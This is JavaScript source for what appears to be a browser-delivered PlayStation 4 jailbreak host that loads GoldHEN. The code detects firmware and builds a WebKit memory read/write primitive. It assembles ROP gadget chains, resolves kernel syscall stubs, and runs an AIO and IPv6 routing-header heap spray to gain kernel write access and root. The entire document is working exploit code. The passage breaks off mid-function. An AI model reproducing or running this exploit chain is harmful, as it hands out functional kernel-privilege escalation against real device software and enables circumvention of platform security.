  function offsetsFor(uaString) {
    const m = (uaString || "").match(/PlayStation\s+4[\/ ](\d+)\.(\d+)/);
    if (!m) return { key: null, off: null };
    const key = m[1] + "." + parseInt(m[2], 16).toString(16).padStart(2, "0");
    return { key, off: PS4[key] || null };
  }

  // slopkit/jb.js
  function ensureHostConsole() {
    var out = document.getElementById("out");
    var st = document.getElementById("state");
    if (!out) {
      out = document.createElement("pre");
      out.id = "out";
      (document.body || document.documentElement).appendChild(out);
    }
    if (!st) {
      st = document.createElement("div");
      st.id = "state";
      (document.body || document.documentElement).appendChild(st);
    }
    return { outEl: out, stateEl: st };
  }
  var _hostCons = ensureHostConsole();
  var outEl = _hostCons.outEl;
  var stateEl = _hostCons.stateEl;
  var lines = [];
  var passCount = 0;
  var failCount = 0;
  var params = new URLSearchParams(location.search);
  var STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
  function hostOk() {
    var m = document.getElementById("progress");
    if (m) {
      m.innerHTML = "GoldHEN v2.4b18.12 Loaded :)";
      m.style.color = "green";
    }
  }
  function hostFail() {
    var m = document.getElementById("progress");
    if (m) {
      m.innerHTML = "Failed to Load! Restart Your Console ...";
      m.style.color = "red";
    }
  }
  function hostAlready() {
    var m = document.getElementById("progress");
    if (m) {
      m.innerHTML = "GoldHEN is Already Loaded";
      m.style.color = "orange";
    }
  }
  function post(tag, detail) {
    try {
      const x = new XMLHttpRequest();
      x.open("POST", "/t", true);
      x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      x.send(
        "PS4-JB&tag=" + encodeURIComponent(tag) + "&detail=" + encodeURIComponent(String(detail == null ? "" : detail))
      );
    } catch (e) {
    }
  }
  var VERBOSE = params.get("verbose") === "1";
  var PROSE = [
    / -- /,
    /\.\s/,
    /;\s/,
    /,\s+(which|so|and that|because|since|as that)\s/,
    /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/,
    /\s+so\s+[a-z]/,
    /\s+\([a-z][^)]{40,}\)/
  ];
  function terse(s) {
    if (VERBOSE || s == null) return s;
    s = String(s);
    for (const re of PROSE) {
      const m = re.exec(s);
      if (m && m.index > 0) s = s.slice(0, m.index);
    }
    s = s.replace(/\s+$/, "");
    if (s.length > 140) s = s.slice(0, 140) + "...";
    return s;
  }
  var SHOW_LOG = params.get("log") === "1";
  if (SHOW_LOG && document.body) document.body.className = "log";
  function finishUI(ok) {
    if (ok) hostOk();
    else hostFail();
    if (SHOW_LOG || !document.body) return;
    document.body.className = ok ? "done" : "fail";
  }
  function mark(tag, detail) {
    const raw = detail;
    detail = terse(detail);

    lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));

    const esc = function(t) {
        return String(t)
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;");
    };

    const l = esc(
        tag + (detail == null || detail === "" ? "" : "  " + detail)
    );

    const c =
        /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i.test(l)
            ? "bad"
            : /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i.test(l)
                ? "warn"
                : /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i.test(l)
                    ? "ok"
                    : "";

    const html = c
        ? '<span class="' + c + '">' + l + "</span>"
        : l;

    var progressEl = document.getElementById("progress");

    if (progressEl) {
        progressEl.innerHTML = html;
    }

    post(tag, raw);
}
  function trace(tag, detail) {
    if (VERBOSE) mark(tag, detail);
    else post(tag, detail);
  }
  function state(t, c) {
    if (!SHOW_LOG || !stateEl) return;
    stateEl.textContent = t;
    stateEl.className = c || "";
  }
  function check(name, ok, detail) {
    if (ok) {
      passCount++;
      mark("PROOF-OK", name + (detail ? "  " + detail : ""));
    } else {
      failCount++;
      mark("PROOF-FAIL", name + (detail ? "  " + detail : ""));
    }
    return ok;
  }
  var SYS = {
    getpid: 20,
    setuid: 23,
    getuid: 24,
    close: 6,
    socket: 97,
    socketpair: 135,
    getsockopt: 118,
    setsockopt: 105,
    mmap: 477,
    munmap: 73,
    thr_self: 432,
    getgroups: 79,
    getgid: 47,
    cpuset_getaffinity: 487,
    cpuset_setaffinity: 488,
    aio_multi_poll: 664,
    aio_multi_delete: 662,
    getegid: 43,
    aio_multi_wait: 663,
    aio_multi_cancel: 666,
    aio_submit_cmd: 669,
    sysctl: 202,
    kill: 37,
    getppid: 39
  };
  var JSVALUE_UNDEFINED = new int64(10, 4294967287);
  var keepAlive2 = [];
  var mainMf = null;
  var mainOrig = null;
  var mainArmed = false;
  var pinRestore = null;
  var jbRestoreHook = null;
  var allDone = false;
  var jailbroken = false;
  var kpatched = false;
  var payloadRunning = false;
  var alreadyLoaded = false;
  (async function() {
    let p = null;
    const opened = [];
    let closeFd = null;
    try {
      let bufAddr = function(ab) {
        const c = p.leakval(ab);
        return p.read8(
          p.read8(c.add32(off.wk_ArrayBuffer_m_impl)).add32(off.wk_ArrayBuffer_m_contents_m_data)
        );
      }, put = function(dv, at, v) {
        if (typeof v === "number") {
          dv.setUint32(at, v >>> 0, true);
          dv.setUint32(at + 4, v < 0 ? 4294967295 : 0, true);
        } else {
          dv.setUint32(at, v.low >>> 0, true);
          dv.setUint32(at + 4, v.hi >>> 0, true);
        }
      }, makeCtx = function() {
        const sb = new ArrayBuffer(32), pb = new ArrayBuffer(PB_SIZE);
        const kb = new ArrayBuffer(8192), fb = new ArrayBuffer(64);
        keepAlive2.push(sb, pb, kb, fb);
        const c = {
          storeDv: new DataView(sb),
          pivotDv: new DataView(pb),
          stackDv: new DataView(kb),
          frameDv: new DataView(fb),
          stackU8: new Uint8Array(kb),
          frameU8: new Uint8Array(fb)
        };
        keepAlive2.push(
          c.storeDv,
          c.pivotDv,
          c.stackDv,
          c.frameDv,
          c.stackU8,
          c.frameU8
        );
        c.S = bufAddr(sb);
        c.P = bufAddr(pb);
        c.K = bufAddr(kb);
        c.F = bufAddr(fb);
        put(c.storeDv, 0, G.G1);
        put(c.storeDv, 8, c.P);
        put(c.storeDv, 16, G.G3);
        put(c.storeDv, 24, G.G2);
        put(c.pivotDv, 0, c.P);
        put(c.pivotDv, 16, G.G5);
        put(c.pivotDv, 32, G.G4);
        return c;
      }, layout = function(c, target, args) {
        c.stackU8.fill(0);
        c.frameU8.fill(0);
        const insts = [];
        for (let i = 0; i < args.length; ++i) {
          insts.push(argGadget[i]);
          insts.push(args[i]);
        }
        const targetIdx = insts.length;
        insts.push(target);
        insts.push(G.POP_RDI_RET);
        insts.push(c.F);
        insts.push(G.MOV_RDI_RAX_RET);
        insts.push(G.POP_RAX_RET);
        insts.push(JSVALUE_UNDEFINED);
        insts.push(G.LEAVE_RET);
        let at = 8192 - 8 * insts.length;
        if ((c.K.low + at + 8 * targetIdx & 15) !== 0) at -= 8;
        for (let i = 0; i < insts.length; ++i)
          put(c.stackDv, at + 8 * i, insts[i]);
        put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
      }, callAddr = function(target, args) {
        layout(M, target, args);
        const saved = p.read8(pivotCell);
        p.write8(pivotCell, M.S);
        Math.expm1(pivotObj);
        p.write8(pivotCell, saved);
        return {
          lo: M.frameDv.getUint32(0, true),
          hi: M.frameDv.getUint32(4, true),
          i32: M.frameDv.getUint32(0, true) | 0
        };
      }, errno = function() {
        const r = callAddr(errorFn, []);
        const a = new int64(r.lo, r.hi);
        return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
      }, makeRpc = function(wk, name) {
        let seq = 0;
        const pending = /* @__PURE__ */ new Map();
        wk.onmessage = function(e) {
          const d = e.data || {};
          const slot = pending.get(d.id);
          if (!slot) return;
          pending.delete(d.id);
          if (slot.timer) clearTimeout(slot.timer);
          if (d.type === "err") slot.reject(new Error(String(d.value)));
          else slot.resolve(d.value);
        };
        wk.onerror = (e) => mark(
          "WORKER-ONERROR",
          name + " " + (e && e.message ? e.message : String(e))
        );
        return function call(fname, timeoutMs, ...args) {
          return new Promise(function(resolve, reject) {
            const id = seq++;
            const timer = timeoutMs > 0 ? setTimeout(function() {
              pending.delete(id);
              reject(new Error(name + ": timeout waiting for " + fname));
            }, timeoutMs) : null;
            pending.set(id, { resolve, reject, timer });
            wk.postMessage({ id, name: fname, args });
          });
        };
      }, ptrish = function(v) {
        return v.hi > 0 && v.hi < 65536 && (v.low & 7) === 0;
      }, setNode0 = function(nextAddr, secondDec) {
        new Uint8Array(pAb).fill(0);
        pDv.setUint8(1, RTH_LEN);
        pDv.setUint8(3, RTH_SEGLEFT);
        put(pDv, 8, secondDec);
        put(pDv, 16, M_AD);
        put(pDv, 48, nextAddr);
      }, armOnce = function() {
        try {
          if (typeof A !== "undefined" && A) A.busy = 1;
        } catch (e) {
        }
        const g = armCount + 1;
        const at = function(t, d) {
          if (armTrace) trace(t, "a=" + g + " " + d);
        };
        at("ARM-P1-FREE", "pool=" + POOL.length);
        for (const fd of POOL)
          sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
        at("ARM-P2-SUBMIT", "freed=" + POOL.length);
        const rs = sc(
          SYS.aio_submit_cmd,
          1 | 4096,
          bufAddr(rqAb),
          2,
          3,
          idAd2
        ).i32;
        if (rs !== 0) {
          at("ARM-SUBMIT-FAIL", "rs=" + rs);
          return "submit=" + rs;
        }
        toDv.setUint32(0, TOWAIT, true);
        toDv.setUint32(4, 0, true);
        at(
          "ARM-P3-WAIT",
          "to=" + TOWAIT + "us submit=0 to_rb=" + toDv.getUint32(0, true) + " toad=" + toAd
        );
        const tw0 = Date.now();
        sc(SYS.aio_multi_wait, idAd2, 2, stAd2, 0, toAd);
        waitMs = Date.now() - tw0;
        at("ARM-P4-SPRAY", "wait=" + waitMs + "ms");
        let n = 0;
        for (const fd of POOL)
          if (sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, pAd, RTH_SIZE).i32 === 0)
            n++;
        armCount++;
        at("ARM-P5-ARMED", "sprayed=" + n + " wait=" + waitMs + "ms");
        return "ok sprayed=" + n + " wait=" + waitMs + "ms";
      }, wnode = function(i, decAddr, sinkAddr, last) {
        const o = i * NODE_SZ;
        put(arDv, o + 0, decAddr);
        put(arDv, o + 8, sinkAddr);
        put(arDv, o + 16, M_AD);
        put(arDv, o + 24, 0);
        put(arDv, o + 32, 0);
        put(arDv, o + 40, 0);
        put(arDv, o + 48, last ? 0 : arAd.add32(o + NODE_SZ));
      }, whoHasF = function() {
        let found = -1, hits = 0, state0 = 0;
        for (let i = 0; i < POOL.length; i++) {
          glDv.setInt32(0, RTH_SIZE, true);
          glDv.setInt32(4, 0, true);
          new Uint8Array(gfAb).fill(0);
          if (sc(SYS.getsockopt, POOL[i], IPPROTO_IPV6, IPV6_RTHDR, gfAd, glAd).i32 !== 0)
            continue;
          const st = gfDv.getUint32(32, true) >>> 0;
          if (st !== 0) {
            hits++;
            if (found < 0) {
              found = i;
              state0 = st;
            }
          }
        }
        return { idx: found, hits, state: state0 };
      }, reapNow = function(tag) {
        if (!REAP || reapedGen === armCount) return;
        wnode(0, DUM, DUM, true);
        reapedGen = armCount;
        const c = sc(SYS.aio_multi_cancel, idAd2, 2, stAd2).i32;
        const p2 = sc(SYS.aio_multi_poll, idAd2, 2, stAd2).i32;
        const d = sc(SYS.aio_multi_delete, idAd2, 2, stAd2).i32;
        post(
          "REAP",
          tag + " gen=" + reapedGen + " cancel=" + c + " poll=" + p2 + " delete=" + d
        );
      }, runChain = function(nNodes, label) {
        snkDv.setInt32(0, 1073741824, true);
        snkDv.setInt32(32, 1073741824, true);
        trace(
          "CH-MTX-PRE",
          label + " owner=" + (mU32[OWNER_HI] >>> 0).toString(16) + ":" + (mU32[OWNER_LO] >>> 0).toString(16) + " want=0:4"
        );
        mU32[OWNER_LO] = 4;
        mU32[OWNER_HI] = 0;
        setNode0(arAd, N0SINK);
        const a = armOnce();
        if (a.indexOf("ok") !== 0) {
          mark("PR-ARM-FAIL", label + " " + a);
          return null;
        }
        trace("CH-CANCEL", label + " nodes=" + nNodes + " walking");
        sc(SYS.aio_multi_cancel, idAd2, 1, stAd2);
        trace("CH-CANCEL-DONE", label + " returned");
        const moved = 1073741824 - snkDv.getInt32(0, true);
        const n0 = 1073741824 - snkDv.getInt32(32, true);
        const w = whoHasF();
        mark(
          "PR-FIRE",
          label + " nodes=" + nNodes + " sink_moved=" + moved + " node0_sink=" + n0 + " f_socket=" + w.idx + " f_hits=" + w.hits + " state=0x" + w.state.toString(16) + " (" + a + ")"
        );
        if (n0 === 1 && w.idx < 0)
          mark(
            "PR-F-UNSEEN",
            "node0 fired but no pool socket carries the state write -- F went to something outside the pool"
          );
        reapNow("a=" + armCount);
        return moved;
      }, simPattern = function(bv, low) {
        let w = bv << 24 >>> 0 | low & 16777215 | 0;
        let out = "";
        for (let k = 0; k < SWEEP; k++) {
          w = w - STEPMAG | 0;
          w = w - 1 | 0;
          out += w <= 0 ? "1" : "0";
        }
        return out;
      }, decodeByte = function(obs, low) {
        let hit = -1, n = 0;
        for (let bv = 0; bv < 256; bv++)
          if (simPattern(bv, low) === obs) {
            if (hit < 0) hit = bv;
            n++;
          }
        return { b: hit, n };
      }, oracleAt = function(addr, n, label) {
        const sAb = new ArrayBuffer(4);
        keepAlive2.push(sAb);
        const sDv = new DataView(sAb), sAd = bufAddr(sAb);
        sDv.setInt32(0, 1073741824, true);
        let i = 0;
        for (let k = 0; k < n; k++) wnode(i++, addr, sAd, false);
        put(arDv, (i - 1) * NODE_SZ + 48, 0);
        if (runChain(i, label) === null) return null;
        const m2 = 1073741824 - sDv.getInt32(0, true);
        return { m: m2, v: m2 > 0 ? n - m2 + 1 : 0 };
      }, sweepAt = function(stepAd, probeAd, low, label) {
        const sAb = new ArrayBuffer(4 * SWEEP);
        keepAlive2.push(sAb);
        const sDv = new DataView(sAb), sAd = bufAddr(sAb);
        for (let k = 0; k < SWEEP; k++) sDv.setInt32(k * 4, 1073741824, true);
        let i = 0;
        for (let k = 0; k < SWEEP; k++) {
          wnode(i++, stepAd, DUM, false);
          wnode(i++, probeAd, sAd.add32(k * 4), false);
        }
        put(arDv, (i - 1) * NODE_SZ + 48, 0);
        if (runChain(i, label) === null) return null;
        let obs = "";
        for (let k = 0; k < SWEEP; k++)
          obs += 1073741824 - sDv.getInt32(k * 4, true) > 0 ? "1" : "0";
        return decodeByte(obs, low);
      }, planSub = function(cur, delta) {
        const d = [
          delta & 255,
          delta >>> 8 & 255,
          delta >>> 16 & 255,
          delta >>> 24 & 255
        ];
        let clean = true;
        for (let j = 1; j < 4; j++)
          if (d[j] > (cur >>> 8 * j & 255)) clean = false;
        return { d, n: d[0] + d[1] + d[2] + d[3], clean };
      }, emitSub = function(base, i, plan) {
        const pos = [];
        for (let j = 0; j < 4; j++)
          for (let q = 0; q < plan.d[j]; q++) pos.push(j);
        for (let j = 0; j < pos.length; j++)
          wnode(i++, base.add32(pos[j]), DUM, false);
        return i;
      }, multiFire = function(jobs, label) {
        let need2 = 0;
        for (const j of jobs) need2 += j.kind === "sweep" ? SWEEP * 2 : j.n;
        mark(
          "MF-PLAN",
          label + " jobs=" + jobs.length + " nodes=" + need2 + " kinds=" + jobs.map(function(j) {
            return j.kind;
          }).join(",")
        );
        if (!check(
          "mf-bounded-" + label,
          need2 > 0 && need2 <= MAXN,
          "need=" + need2 + " arena=" + MAXN
        ))
          return null;
        const nSink = jobs.reduce(function(a, j) {
          return a + (j.kind === "sweep" ? SWEEP : j.kind === "oracle" ? 1 : 0);
        }, 0);
        const sAb = new ArrayBuffer(4 * Math.max(1, nSink));
        keepAlive2.push(sAb);
        const sDv = new DataView(sAb), sAd = bufAddr(sAb);
        for (let k = 0; k < nSink; k++) sDv.setInt32(k * 4, 1073741824, true);
        let i = 0, sk = 0;
        const base = [];
        for (const j of jobs) {
          base.push(sk);
          if (j.kind === "sweep") {
            for (let k = 0; k < SWEEP; k++) {
              wnode(i++, j.step, DUM, false);
              wnode(i++, j.probe, sAd.add32((sk + k) * 4), false);
            }
            sk += SWEEP;
          } else if (j.kind === "oracle") {
            for (let k = 0; k < j.n; k++)
              wnode(i++, j.addr, sAd.add32(sk * 4), false);
            sk += 1;
          } else {
            for (let k = 0; k < j.n; k++) wnode(i++, j.addr, DUM, false);
          }
        }
        if (i === 0)
          return jobs.map(function() {
            return null;
          });
        put(arDv, (i - 1) * NODE_SZ + 48, 0);
        if (runChain(i, label) === null) return null;
        const out = [];
        for (let q = 0; q < jobs.length; q++) {
          const j = jobs[q];
          if (j.kind === "sweep") {
            let obs = "";
            for (let k = 0; k < SWEEP; k++)
              obs += 1073741824 - sDv.getInt32((base[q] + k) * 4, true) > 0 ? "1" : "0";
            out.push(decodeByte(obs, j.low));
          } else if (j.kind === "oracle") {
            const m2 = 1073741824 - sDv.getInt32(base[q] * 4, true);
            out.push({ m: m2, v: m2 > 0 ? j.n - m2 + 1 : 0 });
          } else out.push({ n: j.n });
        }
        return out;
      }, kernFile = function(withBuf, tag) {
        olDv.setInt32(0, withBuf ? KF_BYTES : 0, true);
        olDv.setInt32(4, 0, true);
        const r = sc(SYS.sysctl, mibAd, 2, withBuf ? kfAd : 0, olAd, 0, 0);
        const rv = r.i32, er = rv < 0 ? errno() : 0;
        const ln = olDv.getUint32(0, true);
        mark("KF-SYSCTL", tag + " rv=" + rv + " errno=" + er + " oldlen=" + ln);
        return { rv, err: er, len: ln };
      }, planLow = function(cur, tgt) {
        if (cur.hi >>> 0 !== tgt.hi >>> 0) return null;
        const b = [];
        for (let k = 0; k < 4; k++) b.push(cur.low >>> 8 * k & 255);
        b.push(0, 0, 0, 0);
        const t = [];
        for (let k = 0; k < 4; k++) t.push(tgt.low >>> 8 * k & 255);
        function decwin(j) {
          let c = -1;
          for (let k = 0; k < 4 && j + k < 8; k++) {
            let v = b[j + k] + c;
            if (v < 0) {
              v += 256;
              c = -1;
            } else c = 0;
            b[j + k] = v;
            if (c === 0) break;
          }
        }
        const pos = [];
        for (let j = 0; j < 4; j++) {
          const d = b[j] - t[j] & 255;
          for (let q = 0; q < d; q++) {
            pos.push(j);
            decwin(j);
          }
        }
        const lowOk = b[0] === t[0] && b[1] === t[1] && b[2] === t[2] && b[3] === t[3];
        const hiClean = b[4] === 0 && b[5] === 0 && b[6] === 0 && b[7] === 0;
        if (!lowOk || !hiClean || pos.length < 1 || pos.length > 4090)
          return null;
        return pos;
      };
      await new Promise(function(r) {
        setTimeout(r, 100);
      });
      const { key, off } = offsetsFor(navigator.userAgent);
      mark("FW", key || "(not a PS4 UA)");
      if (!off) {
        state("no offsets for this firmware", "bad");
        var m = document.getElementById("progress");
        if (m) {
          m.innerHTML = 'No offsets for this firmware: <span style="color: red;">' + (key || "Unknown") + "</span>";
        }
        mark("NO-OFFSETS", key || "unknown");
        return;
      }
      const fwKey = key || "unknown";
      const DO_JB = params.get("jb") !== "0";
      const DO_PATCH = params.get("patch") !== "0";
      const DO_PAYLOAD = params.get("payload") !== "0";
      const KEEP_JB = params.get("keepjb") === "1";
      const NEED_K = [
        "k_idt_rsvd",
        "k_oid_kern_file",
        "k_oid_maxfilesperproc",
        "k_oid_maxprocperuid",
        "k_oid_maxfiles",
        "k_arg1_maxfilesperproc",
        "k_arg1_maxprocperuid",
        "k_arg1_maxfiles",
        "k_prison0",
        "k_rootvnode"
      ];
      const missing = NEED_K.filter((k) => off[k] === void 0);
      if (!check(
        "kernel-table-present",
        missing.length === 0,
        "fw=" + fwKey + " missing=[" + missing.join(",") + "] -- dump this firmware with kdump5.html and derive its table with tools/kderive.py; stage=pre_primitive"
      ))
        return;
      const KPATCH_FILE = off.kpatch || fwKey.replace(".", "") + ".bin";
      //const KPATCH_FILE = "slopkit/patches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
      const PAYLOAD_FILE = "payload.bin";
      const needPatch = ["k_sysent_661", "k_jmp_rsi"].filter(
        (k) => off[k] === void 0
      );
      if (!check(
        "kpatch-table-present",
        !DO_PATCH || needPatch.length === 0,
        "missing=[" + needPatch.join(",") + "] blob=" + KPATCH_FILE + " -- build it from patches/<fw>.c, see patches/1300.c"
      ))
        return;
      const needPl = ["wk___imp_pthread_create", "k_pthread_create"].filter(
        (k) => off[k] === void 0
      );
      if (!check(
        "payload-table-present",
        !DO_PAYLOAD || needPl.length === 0,
        "missing=[" + needPl.join(",") + "] payload=" + PAYLOAD_FILE
      ))
        return;
      mark("FW-STATUS", off.fw_status || "none");
      mark(
        "FW-KTABLE",
        "idt_rsvd=0x" + off.k_idt_rsvd.toString(16) + " prison0=0x" + off.k_prison0.toString(16) + " rootvnode=0x" + off.k_rootvnode.toString(16) + " kpatch=" + KPATCH_FILE + " payload=" + PAYLOAD_FILE + " src=ps4_offsets.js"
      );
      const RETRY_MAX = params.get("retry") ? parseInt(params.get("retry"), 10) : 8;
      const RETRY_KEY = "jb1352-read-retry";
      const retryCount = () => {
        try {
          return parseInt(sessionStorage.getItem(RETRY_KEY) || "0", 10) || 0;
        } catch (e) {
          return 0;
        }
      };
      const clearRetry = () => {
        try {
          sessionStorage.removeItem(RETRY_KEY);
        } catch (e) {
        }
      };
      const retryBenign = (why) => {
        const n = retryCount();
        if (n >= RETRY_MAX) {
          mark(
            "AUTO-RETRY-GIVEUP",
            "why=" + why + " after " + n + " reloads -- reboot and try again"
          );
          return false;
        }
        try {
          sessionStorage.setItem(RETRY_KEY, String(n + 1));
        } catch (e) {
        }
        mark(
          "AUTO-RETRY",
          "why=" + why + " reload " + (n + 1) + "/" + RETRY_MAX + " (benign read miss, no kernel write yet)"
        );
        setTimeout(() => {
          try {
            location.reload();
          } catch (e) {
          }
        }, 400);
        return true;
      };
      if (retryCount() > 0)
        mark(
          "AUTO-RETRY-RESUME",
          "read-phase retry " + retryCount() + "/" + RETRY_MAX
        );
      state("running the primitive...", "warn");
      await new Promise((r) => setTimeout(r, 0));
      const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
      const carrier2 = await establishPrimitive({
        maxAttempts: 6,
        onEvent: (t, d, a) => (PRIMITIVE_LOUD.test(t) ? mark : trace)(
          t,
          (a != null ? "[" + a + "] " : "") + (d || "")
        )
      });
      installWindowP(carrier2, { promote: false });
      if (!window.p) throw new Error("window.p was not installed");
      p = window.p;
      mark(
        "PAIR-STATUS",
        "state=" + pairStatus.state + " promoted=" + pairStatus.promoted + "   (promotion off: the 137 MB stays pinned)"
      );
      mark("PRIMITIVE-OK", "");
      const cell = p.leakval(Math.expm1);
      const nativeFn = p.read8(
        p.read8(cell.add32(24)).add32(off.wk_JSFunction_m_function)
      );
      const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
      const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
      const libkernelBase = errorFn.sub32(off.k__error);
      mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
      const aligned = (v) => v.hi > 0 && (v.low & 16383) === 0;
      if (!check(
        "module-bases-0x4000-aligned",
        aligned(webkitBase) && aligned(libkernelBase),
        ""
      ))
        return;
      const G = {};
      const GAD = [
        ["POP_RDI_RET", off.wk_POP_RDI_RET, [95, 195]],
        ["POP_RSI_RET", off.wk_POP_RSI_RET, [94, 195]],
        ["POP_RDX_RET", off.wk_POP_RDX_RET, [90, 195]],
        ["POP_RCX_RET", off.wk_POP_RCX_RET, [89, 195]],
        ["POP_R8_RET", off.wk_POP_R8_RET, [null, 88, 195]],
        ["POP_R9_RET", off.wk_POP_R9_RET, [null, 89, 195]],
        ["POP_RAX_RET", off.wk_POP_RAX_RET, [88, 195]],
        ["LEAVE_RET", off.wk_LEAVE_RET, [201, 195]],
        [
          "MOV_RDI_RAX_RET",
          off.wk_MOV_QWORD_PTR_RDI_RAX_RET,
          [72, 137, 7, 195]
        ],
        ["G0", off.wk_MOV_RDI_RSI_30_CALL, [72, 139, 126, 48]],
        ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [88, 72, 139, 7]],
        ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [85, 72, 137, 229]],
        ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [72, 139, 120, 8]],
        [
          "G4",
          off.wk_MOV_RDX_RAX_18_CALL_10,
          [72, 139, 80, off.pivot_view_sp]
        ],
        ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [82, 92, 195]]
      ];
      let gated = 0;
      for (const [nm, rva, pat] of GAD) {
        const a = webkitBase.add32(rva);
        let good = true;
        for (let i = 0; i < pat.length; ++i) {
          if (pat[i] === null) continue;
          if (p.read1(a.add32(i)) !== pat[i]) {
            good = false;
            break;
          }
        }
        if (good) {
          G[nm] = a;
          gated++;
        } else mark("GADGET-BAD", nm);
      }
      if (!check(
        "gadget-table-fits-module",
        gated === GAD.length,
        gated + "/" + GAD.length
      ))
        return;
      const argGadget = [
        G.POP_RDI_RET,
        G.POP_RSI_RET,
        G.POP_RDX_RET,
        G.POP_RCX_RET,
        G.POP_R8_RET,
        G.POP_R9_RET
      ];
      const stubAddr = /* @__PURE__ */ new Map();
      let seeded = 0;
      if (off.k_stubs) {
        for (const numStr in off.k_stubs) {
          const num = +numStr, o = off.k_stubs[numStr];
          const v = p.read8(libkernelBase.add32(o));
          if ((v.low & 16777215) !== 12633928 || v.hi >>> 24 !== 73) continue;
          if ((v.low >>> 24 | (v.hi & 16777215) << 8) >>> 0 !== num)
            continue;
          stubAddr.set(num, libkernelBase.add32(o));
          seeded++;
        }
      }
      const need = new Set(
        Object.keys(SYS).map((k) => SYS[k]).filter((n) => !stubAddr.has(n))
      );
      let scanned = 0;
      for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
        const v = p.read8(libkernelBase.add32(o));
        if ((v.low & 16777215) !== 12633928 || v.hi >>> 24 !== 73) continue;
        const num = (v.low >>> 24 | (v.hi & 16777215) << 8) >>> 0;
        if (!need.has(num)) continue;
        stubAddr.set(num, libkernelBase.add32(o));
        need.delete(num);
        scanned++;
      }
      mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);
      const miss = Object.keys(SYS).filter((k) => !stubAddr.has(SYS[k]));
      if (!check("syscall-page-needs-stub", miss.length === 0, miss.join(",")))
        return;
      const PB_SIZE = Math.max(40, off.pivot_view_sp + 8 + 15 & ~15);
      const M = makeCtx();
      mainMf = p.read8(cell.add32(24)).add32(off.wk_JSFunction_m_function);
      mainOrig = p.read8(mainMf);
      const pivotObj = {};
      keepAlive2.push(pivotObj);
      const pivotCell = p.leakval(pivotObj);
      p.write8(mainMf, G.G0);
      mainArmed = true;
      const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
      closeFd = (fd) => sc(SYS.close, fd).i32;
      const pid = sc(SYS.getpid).i32;
      check(
        "chain-reaches-kernel",
        pid > 0,
        "pid=" + pid + " uid=" + sc(SYS.getuid).i32
      );
      try {
        const uid0 = sc(SYS.getuid).i32;
        const su0 = sc(SYS.setuid, 0).i32;
        if (uid0 === 0 || su0 === 0) {
          alreadyLoaded = true;
          payloadRunning = true;
          allDone = true;
          mark("ALREADY-ROOT", "getuid=" + uid0 + " setuid(0)=" + su0);
          hostAlready();
          return;
        }
      } catch (eAlready) {
        mark(
          "ALREADY-CHECK-THREW",
          eAlready && eAlready.message || String(eAlready)
        );
      }
      const scratchAb = new ArrayBuffer(4096);
      keepAlive2.push(scratchAb);
      const scratch = bufAddr(scratchAb);
      const argAb = new ArrayBuffer(8);
      keepAlive2.push(argAb);
      const argAddr = bufAddr(argAb), argDv = new DataView(argAb);
      const lenAb = new ArrayBuffer(8);
      keepAlive2.push(lenAb);
      const lenAddr = bufAddr(lenAb), lenDv = new DataView(lenAb);
      const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
      const AF_INET6 = 28, SOCK_DGRAM = 2, AF_UNIX = 1, SOCK_STREAM = 1;
      const RTH_SIZE = 72, RTH_LEN = 8, RTH_SEGLEFT = 4;
      const NODE0_DEC = 67110912, SCRATCH_PAGE = 67108864;
      const SYS_MMAP = 477;
      const PROT_RW = 3, MAP_PRIVATE = 2, MAP_FIXED = 16, MAP_ANON = 4096;
      const NODE_SZ = 56;
      const N_LEAK = params.get("n") ? parseInt(params.get("n"), 10) : 262144;
      const SPRAY = params.get("spray") ? parseInt(params.get("spray"), 10) : 512;
      const SPIN = params.get("spin") ? parseInt(params.get("spin"), 10) : 4e7;
      mark("PR-CFG", "nleak=" + N_LEAK + " spray=" + SPRAY + " spin=" + SPIN);
      async function bringWorker(name) {
        const w = { name, armed: false, wired: false };
        w.worker = new Worker("rpc_worker.js");
        w.rpc = makeRpc(w.worker, name);
        if (await w.rpc("ping", 15e3) !== "pong")
          throw new Error(name + " ping");
        const sLo = 269484032, sHi = 3235774464;
        const arr = await w.rpc("init", 15e3, sLo, sHi);
        keepAlive2.push(arr);
        const D = bufAddr(arr.buffer);
        if (p.read4(D) >>> 0 !== sLo) throw new Error(name + " transfer");
        const storage = p.read8(D.add32(16));
        const mc = ptrish(storage) ? p.read8(storage.add32(8)) : null;
        if (!mc || !ptrish(mc)) throw new Error(name + " walk");
        const bf = p.read8(mc.add32(8));
        let wm = null, wv = null, wl = null;
        for (let k = 1; k <= 8; ++k) {
          const val = p.read8(bf.sub32(8 * k));
          if (!ptrish(val)) continue;
          const inl = p.read8(val.add32(16));
          const len = p.read4(val.add32(24)) >>> 0;
          if (inl.hi === 0 && inl.low === 2) {
            if (!wl) wl = val;
          } else if (inl.hi > 0 && len === 6) {
            if (!wm) wm = val;
          } else if (inl.hi > 0 && len === 48) {
            if (!wv) wv = val;
          }
        }
        if (!(wm && wv && wl)) throw new Error(name + " shapes");
        w.master = wm;
        w.origVector = p.read8(wm.add32(16));
        p.write8(wm.add32(16), wv);
        w.wired = true;
